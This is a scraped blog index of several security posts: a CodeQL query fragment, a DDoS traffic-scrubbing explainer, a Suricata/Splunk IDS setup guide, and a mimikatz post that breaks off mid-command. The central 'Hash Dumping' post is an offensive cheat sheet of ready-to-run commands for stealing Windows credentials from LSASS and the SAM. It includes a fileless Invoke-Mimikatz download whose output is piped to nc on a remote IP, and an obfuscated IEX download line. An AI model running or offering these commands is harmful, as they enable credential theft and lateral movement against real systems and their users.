@problem.severity error * @precision high * @id java/sectest * @tags security *       external/cwe/cwe-113 */import javaimport semmle.code.java.dataflow.FlowSourcesimport DataFlow::PathGraphclass GetOrderIdByIMEIMethod extends Method &#123;  GetOrderIdByIMEIMethod() &#123;    getDeclaringType().hasQualifiedName(&quot;com.xiaomi.miui.lockServer.utils&quot;, &quot;HttpUtils&quot;) and    hasName(&quot;getRemoteUserIP&quot;)  &#125;&#125;//ql自动调用实现类中的方法abstract class HeaderSplittingSink extends DataFlow::Node &#123; &#125;//sink为目标函数的参数class OrderHeaderSplittingSink extends HeaderSplittingSink&#123;  OrderHeaderSplittingSink()&#123;    exists(GetOrderIdByIMEIMethod m, MethodAccess ma |      ma.getMethod() = m and      this.asExpr() = ma.getArgument(0)    )  &#125;&#125;class ResponseSplittingConfig extends TaintTracking::Configuration &#123;  ResponseSplittingConfig() &#123; this = &quot;ResponseSplittingConfig&quot; &#125;  override predicate isSource(DataFlow::Node source) &#123;    //source instanceof RemoteFlowSource    exists(source.asExpr())  &#125;  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof HeaderSplittingSink &#125;&#125;from DataFlow::PathNode source, DataFlow::PathNode sink, ResponseSplittingConfig confwhere conf.hasFlowPath(source, sink)select sink.getNode(), source, sink, &quot;vulnerability due to this $@.&quot;,  source.getNode(), &quot;user-provided value&quot;\n\nSource和Sinkhttps://www.buaq.net/go-82569.html\nhttps://www.jianshu.com/p/338d14e723c0\nReferenceCodeQL编写指南：\n\ncodeql&#x2F;ql-style-guide.md at master\n\nWriting CodeQL queries\n\nAbout QL packs\n\nhttps://www.faiz2035.top/posts/codeql-getting-started/\n\nmark&#x2F;CodeQL-数据流在Java中的使用\n\n\nhttps://www.buaq.net/go-82569.html\nhttps://codeantenna.com/a/fnmZS3Qg4F\nhttps://cloud.tencent.com/developer/article/1645870\n","categories":["代码审计"],"tags":["CodeQL"]},{"title":"攻击流量的清洗","url":"/2017/06/%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E7%9A%84%E6%B8%85%E6%B4%97/","content":"前言　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和防护规则的调整来进行平衡。\n​    如果流量清洗的漏报率太高，就会有大量的攻击请求穿透流量清洗设备，如果无法有效地减少攻击流量，也就达不到减轻服务器压力的效果；相反，如果误报率太高，就会出现大量的正常请求在清洗过程中被中断，严重影响正常的服务和业务运行。\n​    优秀的流量清洗设备，应该能够同时将误报率和漏报率降低到可以接受的程度，这样就能够在不影响网络或业务系统正常运行的情况下，最大限度地将恶意攻击流量从全部网络流量中去除。要达到这个目的，需要同时使用多种准确而高效的清洗技术，这些技术包括：\n\nIP信誉检查\n攻击特征匹配\n速度检查与限制\nTCP代理和验证\n协议完整性验证\n客户端真实性验证\n\nIP信誉检查　　IP信誉机制是指为互联网上的IP地址赋予一定的信誉值，那些过去或现在经常被作为僵尸主机发送垃圾邮件或发动拒绝服务攻击的IP地址会被赋予较低的信誉值，说明这些IP地址更有可能成为网络攻击的来源。\n　　IP信誉检查的极端情况就是IP黑名单机制，即如果数据包的来源存在于黑名单当发生分布式拒绝服务攻击时，流量清洗设备会对通过的网络流量进行IP信誉检查，在其内部的IP地址信誉库中查找每一个数据包来源的信誉值，并会优先丢弃信誉值低的IP地址所发来的数据包或建立的会话连接，以此保证信誉高的IP地址与服务器的正常通信。\n攻击特征匹配　　在大多数情况下，发动分布式拒绝服务攻击需要借助攻击工具。为了提高发送请求的效率，攻击工具发出的数据包通常是由编写者伪造并固化到工具当中的，而不是在交互过程中产生的，因此一种攻击工具所发出的数据包载荷会具有一些特征。流量清洗设备可以将这些数据包载荷中的特征作为指纹，来识别工具发出的攻击流量。指纹识别可以分为静态指纹识别和动态指纹识别两种。\n​    静态指纹识别是指预先将多种攻击工具的指纹特征保存在流量清洗设备内部，设备将经过的网络数据包与内部的特征库进行比对，直接丢弃符合特征的数据包。\n​    动态指纹识别则需要清洗设备对流过的网络数据包进行学习，在学习到若干个数据包的载荷部分之后，将其指纹特征记录下来，后续命中这些指纹特征的数据包会被丢弃，而长期不被命中的指纹特征会逐渐老化直至消失。\n速度检查与限制　　一些攻击方法在数据包载荷上可能并不存在明显的特征，没有办法进行攻击特征匹配，但却在请求数据包发送的频率和速度上有着明显的异常。这些攻击方法可以通过速度检查与限制来进行清洗。\n​    例如，在受到THC SSL DoS攻击时，会在同一个SSL会话中多次进行加密密钥的重协商，而正常情况下是不会反复重协商加密密钥的。因此，当流量清洗设备进行统计时，如果发现SSL会话中密钥重协商的次数超过了特定的阈值，就可以直接中断这个会话并把来源加入黑名单中。\n​    再如，在受到Slowloris和慢速POST请求攻击时，客户端和服务器之间会以非常低的速率进行交互和数据传输。流量清洗设备在发现HTTP的请求长时间没有完成传输时，就可以将会话中断。此外，对于UDP洪水攻击等一些没有明显特征、仅通过大流量进行攻击的方法，可以通过限制流速的方式对其进行缓解。\nTCP代理和验证　　SYN洪水攻击等攻击方式都是利用TCP协议的弱点，将被攻击目标的连接表占满，使其无法创建新的连接而达到拒绝服务攻击的目的。流量清洗设备可以通过TCP代理和验证的方法来缓解这种攻击造成的危害。\n​    在一个TCP SYN请求到达流量清洗设备后，设备并不将它交给后面的服务器，而是直接回复一个SYN+ACK响应，并等待客户端回复。如果SYN请求来自合法的用户，那么他会对SYN+ACK进行响应，这时流量清洗设备会代替用户与其保护之后，合法的用户和服务器之间就可以透过流量清洗设备，进行正常数据通信。对于用户来说整个过程是完全透明的，正常的交互没有受到任何影响。然后服务器建立起TCP连接，并将这个连接加入信任列表当中。而如果这个SYN请求来自攻击者，那么它通常不会对SYN+ACK进行应答，从而形成半开连接。这样流量清洗设备会暂时保留这个半开连接，并在经过短暂的超时时间之后丢弃这个连接\n　　相比于所保护的服务器，流量清洗设备对连接表操作进行了专门优化，能够处理极其庞大的连接请求数量，因此即使有非常多的SYN请求同时涌向清洗设备，清洗设备也能够处理。在这个过程中，由于清洗设备拦截在被保护的服务器之前，服务器并没有消耗任何的连接资源，因此保证了服务器的性能不受影响。\n​    流量清洗设备在作为TCP代理进行防护时，除了拦截半开连接外，还可以进行TCP协议的一些交互式验证。例如，在收到第一个SYN请求时，通过直接丢弃、发送RST包或发送错误序列号的ACK包的方式来中断连接过程，并检查客户端是否重新发起连接请求。通过这种验证，也可以识别并丢弃许多不合法的连接。\n协议完整性验证　　为了提高发送攻击请求的效率，大多数的攻击方法都会只发送攻击请求，而不接收服务器响应的数据，或者无法完全理解和处理响应数据。因此，如果能够对请求来源进行交互式验证，就可以检查请求来源协议实现的完整性。\n​        对于协议实现不完整的请求来源，通常可以将其作为攻击主机丢弃其发送的数据。在DNS解析的过程中，如果域名解析请求获得的响应数据中Flags字段的Truncated位被置位，通常客户端就会使用TCP 53端口重新发送域名解析请求。而攻击者使用的攻击工具由于不接收或不处理解析请求的响应数据，也就不会使用TCP 53端口进行重新连接。流量清洗设备可以利用这个区别来有效地区分合法用户与攻击者，拦截恶意的DNS攻击请求\n　　对于提供HTTP服务的Web服务器，也可以使用类似的方式进行协议完整性验证。例如，可以使用HTTP协议中的302重定向来验证请求的来源是否接收了响应数据并完整实现了HTTP协议的功能。HTTP的302状态码表示被请求的资源被临时转移，并会给出一个转移后的地址。正常的合法用户在接收到302重定向后会顺着跳转地址寻找对应的资源，而攻击者的攻击工具由于不接收或不处理响应数据，则不会进行跳转，因此攻击请求会被清洗设备拦截，Web服务器不会受到任何影响。\n客户端真实性验证　　进行协议完整性验证能够清洗掉一部分简单的攻击工具所发送的攻击流量，但是，一些攻击工具在开发过程中使用了现成的协议库，这样就能够完整实现协议交互，通过协议完整性检验。对于这些攻击工具，需要使用客户端真实性验证技术进行攻击流量清洗。\n​    客户端真实性验证是指对客户端程序进行挑战–应答式的交互验证，检查客户端能否完成特定的功能，以此来确定请求数据是否来自真实的客户端。对基于页面的Web服务，可以通过检查客户端是否支持JavaScript来验证请求是否来自真实的浏览器客户端。当收到HTTP请求时，流量清洗设备会使用JavaScript等脚本语言发送一条简单的运算操作。如果请求是由真实的浏览器发出的，那么浏览器会进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器跳转到Web服务器上真正的资源位置，不会影响正常用户的访问；而如果请求是由攻击者通过攻击工具发送的，由于大部分工具没有实现JavaScript的解析和执行功能，因而不能返回正确的运算结果，流量清洗设备会直接丢弃这些请求，而不会给出跳转到Web服务器的连接，因此Web服务器不会受到影响\n　　当然，攻击者也可以牺牲工具的一部分攻击效率，并在工具中加入JavaScript的解析和执行功能，以便通过JavaScript验证。这时，则需要使用验证码进行人机识别。验证码的全称是“全自动区分计算机和人类的图灵测试”（Completely Automated Public Turing test to tell Computers and Humans Apart，CAPTCHA），这是一种用于分辨人与计算机的反向图灵测试。\n图灵测试和反向图灵测试　　图灵测试（又称图灵判断）是图灵提出的一个关于机器人的著名判断原则。图灵测试是一种测试机器是不是具备人类智能的方法：被测试的包括一个人和一台声称自己有人类智力的机器。测试人在与被测试者（一个人和一台机器）隔开的情况下，通过一些装置（如键盘）向被测试者随意提问。问过一些问题后，如果测试人不能确认被测试者的答复中哪个是人、哪个是机器的回答，那么这台机器就通过了测试，并被认为具有人类智能。目前，还没有一台机器能够通过图灵测试。可以看出，图灵测试是由人来出题考验机器，其目的是让出题人无法分辨给出答案的是人还是机器；而验证码与这个过程相反，是由机器来自动生成题目，其目的是让出题人能够有效地分辨给出答案的是不是真实的人。因此，验证码通常被认为是一种反向图灵测试。常见的验证码是让用户输入一个扭曲变形的图片上所显示的文字。对于真实的人类用户来说，通常能够比较容易地识别出这些文字，给出正确的识别结果，从而通过测试并继续进行访问\n　　而对于计算机来说，想要识别验证码中的文字则相当困难。对于无法给出验证码正确识别结果的请求，流量清洗设备会直接丢弃，从而保护Web服务器不受影响误区：DDoS的云端清洗服务和本地缓解设备可以相互替代。DDoS其实是多种攻击的统称，不同的攻击也许要不同的缓解方法。通常，云端清洗服务主要采用稀释和分流的方法，擅长应对流量型DDoS攻击；而本地缓解设备能够处理的流量较小，更容易组合使用多种清洗技术，适合对抗系统资源消耗型和应用资源消耗型DDoS攻击。用户应该根据自己的业务特点和主要威胁，选择适合自身的解决方案。\n","categories":["安全建设"],"tags":["DDOS","IDS"]},{"title":"构建基于Suricata+Splunk的IDS入侵检测系统","url":"/2017/12/%E6%9E%84%E5%BB%BA%E5%9F%BA%E4%BA%8Esuricata-splunk%E7%9A%84ids%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F/","content":"一.什么是IDS和IPSIDS（Intrusion Detection Systems）：\n入侵检测系统，是一种网络安全设备或应用软件，可以依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，并发出安全警报。\nIPS（Intrusion Prevention System）：\n入侵防御系统，除了具有IDS的监控检测功能之外，可以深度感知检测数据流量，对恶意报文进行丢弃，以阻止这些异常的或是具有伤害性的网络行为。IPS入侵防御系统，是在IDS入侵检测系统的基础上，增加了事件处理以及安全防护功能，能够主动对安全事件进行响应。\nNSM：\n网络安全监控系统，用于收集、检测和分析网络安全数据，通常IDS是其组成部分之一。\n二.IDS&#x2F;IPS的功能及分类IDS根据两种方法进行分类：按照数据来源、按照入侵检测策略。\n1、按照数据来源分类\n\n基于网络的入侵检测系统（NIDS）\n基于主机的入侵监测系统（HIDS）\n分布式入侵检测系统（DIDS）\n\n2、按照入侵检测策略分类\n\n滥用检测\n异常检测\n完整性分析\n\nIPS从功能上具有以下几个组成部分：\n\n数据采集：采集和捕获流量数据\n入侵检测：分析流量和日志数据，发现安全异常行为并发出警报,常见的有Snort、Suricata、Bro\n结果展示：用于分析IDS警报并进行友好展示,常见的IDS警报分析工具有Snorby、Sguil、Base等\n安全防御：主动响应安全事件，采取丢弃数据包等等措施来阻止异常网络行为，比如与iptables联用\n\n三.IDS检测方法IDS根据入侵检测的行为分为：异常检测和误用检测。\n1、异常检测方法\n\n统计异常检测方法\n特征选择异常检测方法\n基于贝叶斯推理异常检测方法\n基于贝叶斯网络异常检测方法\n基于模式预测异常检测方法\n\n2、误用检测方法\n\n基于条件的概率误用检测方法\n基于专家系统误用检测方法\n基于状态迁移分析误用检测方法\n基于键盘监控误用检测方法\n基于模型误用检测方法\n\n四.构建基于Suricata+Splunk的IDSSuricata\n 随着越来越多的服务器将网卡升级到10GB&#x2F;40GB以太网，对线路上的硬件进行计算密集型的入侵检测越来越困难。suircata是一款支持IDS和IPS的多线程入侵检测系统，与传统snort相比，suricata的多线程和模块化设计上使其在效率和性能上超过了原有snort，它将 CPU 密集型的深度包检测工作并行地分配给多个并发任务来完成。这样的并行检测可以充分利用多核硬件的优势来提升入侵检测系统的吞吐量，在数据包的深度检测上效果优越。并且suricata可以兼容现有的Snort规则签名，还增加了对ipv6的支持，已经逐渐成为传统snort入侵检测系统的代替方案。\n\n\n\n参数\nSnort\nSuricata\n\n\n\n安装方式\n源码安装、安装包安装\n源码安装\n\n\n协议\nTCP，UDP，ICMP，IP\nTCP，UDP，ICMP，IP，HTTP，FTP，TLS（SSL），SMB，DNS\n\n\n规则\nSnort规则，EmergingThreats规则\nSnort规则，EmergingThreats规则，VRT::Snort 规则\n\n\n线程\n单线程\n多线程\n\n\nIPS支持\n与iptables等联用实现\n支持自动处理\n\n\nIPv6支持\n少数支持\n全面支持\n\n\n抓包方式\nlibpcap\nPF_RING, cua,netmap,af-packet\n\n\n帮助资料\n官网及网络上大量资料\nSuricata wiki\n\n\nSplunk\n splunk是一款数据分析系统。它在快速收集、搜索、分析、实时获取数据方面的能力较为突出，效率高，能够处理PB级数据，并且它支持对数据源进行实时监控。支持自定义过滤规则。splunk使用简单，通过用户图形界面进行各种统计分析操作， 能够对数据进行可视化展示，形象直观。\n本实验中利用splunk实时监控IDS的警报日志文件fast.log。\n1.安装Suricata wiki参考文档\n1.安装suricata依赖\napt-get -y install libpcre3 libpcre3-dbg libpcre3-dev \\build-essential autoconf automake libtool libpcap-dev libnet1-dev \\libyaml-0-2 libyaml-dev zlib1g zlib1g-dev libmagic-dev libcap-ng-dev \\libjansson-dev pkg-config\n\n安装libhtp库\ngit clone  https://github.com/OISF/libhtp.gitcd libhtp/./autogen.sh./configuremake &amp;&amp; sudo make install\n\n2.下载suricata\n去官网下载suricata并解压\n3.编译suricata\n默认模式下，Suricata以IDS模式运行，编译命令：\n./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var\n\n如果需要 Suricata 同时运行 IDS 和 IPS，需要安装额外依赖并使用如下命令进行编译\nsudo apt-get -y install libnetfilter-queue-dev libnetfilter-queue1 libnfnetlink-dev libnfnetlink0  ./configure --enable-nfqueue --prefix=/usr --sysconfdir=/etc --localstatedir=/var\n\n4.安装suricata\nmake &amp;&amp; sudo make installsudo make install-conf # 安装默认配置  sudo make install-rules # 安装默认规则  sudo ldconfig # 让系统共享动态链接库  \n\n\n\n2.配置并使用Suricata监控安全事件(1) 编辑配置文件如果我们安装时使用下面的命令，会进行默认配置，我们只需要修改相关配置文件中的参数即可。如果已经使用了默认配置，请直接跳到步骤4。\nsudo make install-conf  # 安装默认配置  sudo make install-rules # 安装默认规则 \n\n如果没有安装默认配置和规则，我们需要手动进行配置。参考步骤1、2、3。\n(2) 创建Suricata配置目录和日志目录sudo mkdir /var/log/suricatasudo mkdir /etc/suricata\n\n把规则文件拷贝到Suricata配置目录下wget http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gztar zxvf emerging.rules.tar.gzsudo cp -R rules/ /etc/suricata/\n\n把Suricata安装源文件中的suricata.yaml、classification.config、reference.config文件拷贝到Suricata的配置目录下cd suricatasudo cp suricata.yaml classification.config reference.config /etc/suricata/\n\n编辑配置文件suricata的配置文件路径是： /etc/suricata/suricata.yaml\nsudo vim /etc/suricata/suricata.yaml\n\n我们需要注意一下几个关键参数\nHOME_NET: 它指定了Suricata 监控的本地网络，根据自己的网络情况进行修改\nHOME_NET: &quot;[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]&quot;\n\nEXTERNAL_NET 变量的 !$HOME_NET 代表除本地网络之外的其他网络。\n**default-log-dir**：日志文件存储路径，默认是&#x2F;var&#x2F;log&#x2F;suricata。\n**outputs**：outputs选项下有很多可以输出的配置选项，包括警告、检测的数据包、产生的结果等，可以根据自己的需求进行配置。\n\nfast.log：默认的警告输出文件。\nunified2.alert：数据包输出文件，将整个数据包以二进制的方式存储到文件中。\nhttp.log：HTTP日志，包含了http请求、HOST字段、URI字段和User-Agent字段。\nSyslog：这个选项决定了是否将suricata的警告输出到syslog文件中。\nDrop.log：当suricata工作在IPS模式下的时候，可以使用drop操作规则，这些drop掉的数据包信息就会存储在drop.log文件中\n\nmax-pending-packets: 设置suricata能同时处理的数据包数量，最少为1，最大值取决于内存的大小，更大的内存可以设置更大的值并拥有更好的性能，默认值是1024。\n**default-packet-size**：对处理的每个数据包的大小进行限制。默认值是1514，也是TCP数据包的最大长度（当数据超过这个长度便会使用TCP报文重组技术）。\n(3) 编辑测试规则针对suricata的安全规则的配置，可以参考suricata配置文档\n修改/etc/suricata/suricata.yaml文件，设置我们的测试规则文件my.rules\ndefault-rule-path: /etc/suricata/rulesrule-files: - my.rules\n\n然后我们去/etc/suricata/rules目录下创建我们的自定义规则文件my.rules\n在该文件中，我们写下自己的测试规则\nalert icmp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;TEST :ICMP PING&quot;; itype:8; sid:20000; rev:3;)alert tcp any any -&gt; any 80 (msg:&quot;http test&quot;;)alert http any any -&gt; any any (msg:&quot;Filemagic jgp(1)&quot;; flow:established; filemagic:&quot;JPEG image data&quot;; filestore; sid:10; rev:1;)\n\n\n\n(4) 运行suricata进行测试Suricata有不同的运行模式，我们可以使用如下命令查看\nsudo suricata --list-runmodes\n\n启动Suricata之前，强烈建议先关闭网卡的LRO&#x2F;GRO功能（即网卡收包时将同一流的小包合并成大包）。这会导致Suricata处理时很容易出现丢包问题，传输速度慢。解决方法，关闭LRO&#x2F;GRO功能，命令：\nethtool -k eth0 #查看LRO/GRO当前是否打开ethtool -K eth0 lro off #关闭LROethtool -K eth0 gro off #关闭GRO\n\n如果看到下列警示信息，可以忽视。它说明你的网卡不支持LRO。\nCannot change large-receive-offload\n\n然后我们启动suricata\nsudo suricata -c /etc/suricata/suricata.yaml -i eth0\n\n此时，suricata会开始监听我们的流量，如果触发了规则，会在默认日志路径/var/log/suricata/下产生警报文件fast.log\n3.使用Suricata监控网络攻击模拟网络攻击：mysql暴力破解\nIDS检测规则\nalert tcp $EXTERNAL_NET any -&gt; $HOME_NET 3306 (msg:&quot;MySQL Login Attack&quot;; sid:11619; gid:3; rev:6; classtype:attempted-admin; reference:cve,2006-1518; metadata: engine shared, soid 3|11619, service mysql;)\n\n此规则可以检测出尝试枚举mysql管理员密码的暴力破解攻击。\n4.使用Splunk分析展示IDS警报下载splunklight版\n安装web环境：php+apache2\nsudo apt-get install php7.0 libapache2-mod-php7.0 apache2\n\n运行splunk服务\ncd splunk\\bin\\./splunk start\n\n然后访问本机8080端口即可。我们可以动态监控警报文件/var/log/suricata/fast.log\n","categories":["安全建设"],"tags":["IDS","Snort"]},{"title":"Hash Dumping","url":"/2020/01/hash-dumping/","content":"Hash Dumpingmimikatzmimikatz.exe &quot;privilege::debug&quot; log &quot;sekurlsa::logonpasswords full&quot; exit@echo offmimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; C:\\programdata\\log.txtSSPLoader.exe C:\\Users\\XuanJian\\Desktop\\ssp\\lsassDump.dll    注意需要用绝对路径！C:\\Users\\Public\\Videos\\dump.binmimikatz.exe &quot;sekurlsa::minidump dump.bin&quot; log &quot;sekurlsa::logonPasswords full&quot; exit使用方法如下：privilege::debuginject::process lsass.exe F:\\tools\\x64\\sekurlsa.dll@getLogonPasswords//提升权限privilege::debugdllinject::process lsass.exe sekurlsa.dll@getLogonPasswordsmimikatz.exe &quot;privilege::debug&quot; log &quot;sekurlsa::logonpasswords full&quot; exitmimikatz # privilege::debugmimikatz # sekurlsa::minidump C:\\Users\\John\\Desktop\\minidump_656.dmp#从SAM转储凭mimikatz # token::elevatemimikatz # lsadump::sam#注入mimikatz的ssp（mimilib.dll）窃取凭据privilege::debugmisc:memssp\n\n\n\n Invoke-Mimikatz\npowershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot; | nc -vv 192.168.3.28 1234\n\n\n\nprocdumpprocdump.exe -accepteula -ma lsass.exe lsass.dmppypykatz lsa minidump lsass.dmp\n\n\n\ncomsvcs.dll一个名为comsvcs.dll的DLL ，它在C:\\Windows\\System32每次崩溃时都会转储进程内存。该DLL包含一个称为的MiniDumpW函数，可以通过rundll32.exe调用，但只能SYSTEM权限执行\ntasklist /fi &quot;imagename eq lsass.exe&quot;rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full\n\n\n\nexecutes mimikatz.xmlhttps://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\1.xmlmimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords\n\n\n\nFrom SAM注册表导出Hash\nreg save HKLM\\SYSTEM system.hivereg save HKLM\\SAM sam.hivereg save hklm\\security security.hivemimikatz.exe &quot;lsadump::sam /system:system.hive /sam:sam.hive&quot; exitC:\\temp&gt; reg save HKLM\\SYSTEM system.hiveC:\\temp&gt; reg save HKLM\\SAM sam.hive mimikatz # lsadump::sam /SYSTEM:system.hive /SAM:sam.hive#使用kali中的samdump2来读取system和sam：samdump2 system sam#mimikatz 也可以导入sam和systemmimikatz # xx\n\n\n\navdumptasklist /svc | findstr lsass.exeC:\\Program Files\\Avast Software\\Avast\\avdump64.exe --pid 532 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\\ProgramData\\lsass.dmpmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;\n\nmetasploit\nuse windows/gather/avast_memory_dump\n\n\n\nrdrleakdiag鸣叫由格热戈日Tworek（@ 0gtweet）\nFile Path: C:\\Windows\\system32\\rdrleakdiag.exeDescription: Microsoft Windows Resource Leak Diagnosticrdrleakdiag.exe /p &lt;pid&gt; /o &lt;outputdir&gt; /fullmemdmp /wait 1\n\n此命令利用系统二进制rdrleakdiag.exe，该文件将转储其输入中提供了PID（进程ID）的进程的内存。成功执行该命令将导致创建两个文件，分别为minidump_656.dmp和results_656.hlk。[我们将使用扩展名为.dmp的文件]\nDiskShadow卷影复制\nwmic shadowcopy call create volume=&#x27;C:\\&#x27;vssadmin list shadowscopy xxx\\Windows\\system32\\config\\sam .copy xxx\\Windows\\system32\\config\\security .copy xxx\\Windows\\system32\\config\\system .impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL然后用得到的Hash去解密\n\n\n\npypykatzPypykatz通过项目Skelsec可以帮助我们解决这个问题。Skelsec用纯python开发了Mimikatz的部分实现，这意味着跨平台。像Mimikatz一样，此工具使我们可以提取lsass转储，并且此工具可以不用将转储文件下载到本地解密，而是直接在目标机器上提取。\n远程分析转储文件\npypykatz lsa minidump lsass.dmppypykatz lsa minidump adsec.local/jsnow:Winter_is_coming_\\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp\n\n\n\nsecretsdumpimpacket 中提供了secrestdump的脚本，该脚本可允许转储存储在注册表中的sam、SECURITY、SYSTEM中的所有凭据。\nreg save hklm\\sam sam.hivereg save hklm\\system system.hive reg save hklm\\security security.hivesecretsdump -sam sam.hive -security security.hive -system system.hive local#kaliimpacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL\n\n\n\nsqldumpertasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号C:\\Program Files\\Microsoft SQL Server\\number\\Shared\\sqldumper.exe ProcessID 0 0x01100  导出mdmp文件mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit\n\n\n\nrocdump\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;\n\n\n\nWindows Credential Editor (WCE)https://attack.mitre.org/software/S0005\nlsassyhttps://github.com/Hackndo/lsassy/wiki/Lsassy-Advanced-Usage\n远程dump\nlsassy -d de1ay.com -u administrator -H 161cff084477fe596a5db81874498a24 192.168.100.19 -o C:\\Users\\Administrator\\Desktop\\test.txt\n\n\n\n对于涉及凭证转储的特定操作，我们还可以在项目授权下使用secretsdump.py脚本。\n除了以下类型的哈希外，还存在另一种哈希，即MsCacheV2（也称为域缓存凭据），它在Windows中引入，即使客户端计算机与域断开连接，也可以保持用户与域的连接，用户可以执行身份验证。在以NT AUTHORITY \\ SYSTEM特权运行缓存的凭据密钥后，在注册表编辑器（regedit.msc）下运行后，我们可以在注册表位置（HKLM \\ SECURITY \\ Cache）下看到。\n通过使用命令lsadump :: cache，我们可以轻松地转储这些哈希值。 \nmimikatz # lsadump::cache\n\n\n\nmscash，或者叫 domain cached credentials、域缓存票据，与用户在成功登录后将缓存的域凭据存储在系统本地，缓存的凭据不会过期，以防止DC无法通信，任然能够登录机器，另外mscash hash 无法用于PTH。\n\n具体存储在系统哪里，保存在注册表中，结构未域凭据+域授权信息，后面就直接用 “凭据” 来代表 “凭据信息” + “授权信息”。\n\nPowershellpowershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://x.x.x.x/ps/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatzpowershell &quot;$a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;$b=&#x27;tp://x.x.x.x/ps/Invoke-Mimikatz.ps1&#x27;&#x27;)); Invoke-Mimikatz&#x27;;IEX ($a+$b)&quot;\n\n\n\n\n\nlsass.dmppypykatz lsa minidump lsass.dmp\n\n\n\nLive kernel dump with PowerShell one-liner\nhttps://twitter.com/0gtweet/status/1273264867382788096\n$ss = Get-CimInstance -ClassName MSFT_StorageSubSystem -Namespace Root\\Microsoft\\Windows\\StorageInvoke-CimMethod -InputObject $ss -MethodName &quot;GetDiagnosticInfo&quot; -Arguments @&#123;DestinationPath=&quot;C:\\dmp&quot;; IncludeLiveDump=$true&#125;\n\nhttps://gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump-c5ab38d8\nhttps://www.volatilityfoundation.org/releases\n绕卡巴\nhttps://www.freebuf.com/column/231880.html\nReference\nhttps://attack.mitre.org/techniques/T1003/001/\nhttps://baijiahao.baidu.com/s?id=1626592610700813942&amp;wfr=spider&amp;for=pc\n抓取HASH的10001种方法\nhttps://iv4n.cc/lsass-dump/\nhttps://en.hackndo.com/remote-lsass-dump-passwords/\nhttps://www.pureid.io/dumping-abusing-windows-credentials-part-1/\nhttps://cloud.tencent.com/developer/article/1656546\n你并不懂 Mimikatz Part 1 - Wdigest SSP\n你并不懂 Mimikatz Part 2 - MSCACHE\nhttps://0x1.gitlab.io/reconnaissance-tools/lsassy/\n\n","categories":["攻防渗透"],"tags":["HashDumping","Mimikatz"]},{"title":"mimikatz抓取明文密码","url":"/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/","content":"mimikatz基本使用下载：Mimikatz\n注意：mimikatz需要以管理员权限运行\n1、交互模式抓取明文密码\nprivilege::debugsekurlsa::logonpasswords\n\n2、更方便的mimikatz命令\nmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot;\n\n3、输出日志\n执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：\nmimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit\n\n3、bat脚本\n@echo offmimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; C:\\programdata\\log.txt\n\n\n\n防护机制Windows中存在一些安全策略或机制来防止像mimikatz 或WCE等工具直接抓取明文密码。\n移除DEBUG权限调试权限是一种安全策略设置，允许用户将调试器附加到进程或内核。绝大数抓取密码工具都需要获取调试权限，该权限可以在用户权限分配组策略在看到。默认情况下，管理员帐户具有此权限。如果移除了debug权限，则此类工具则会工作异常。\n\n在没有debug权限的情况下:\n\nLSA保护LSA包含本地安全性授权子系统服务 (LSASS) 进程，可验证用户的本地和远程登录。 微软从Windows 8.1 和Windows Server 2012开始为LSA提供附加保护，LSASS可以配置为在保护模式下运行，受保护的进程必须满足一些条件才能访问lsass.exe进程，主要通过签名验证，从而避免了相关工具抓取密码。\n开启保护的方法是配置方法为修改注册表项RunAsPPL，将键值设置为&quot;dword:00000001\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL\n\n在开启LSA保护的情况下，此时无法从LSASS进程中转储凭据，报错示例：\nmimikatz # sekurlsa::msvERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)mimikatz # privilege::debugPrivilege &#x27;20&#x27; OKmimikatz # sekurlsa::logonPasswordsERROR kuhl_m_sekurlsa_acquireLSA ; Logon list\n\n绕过方法是删除lsass进程上的保护：\nmimikatz# 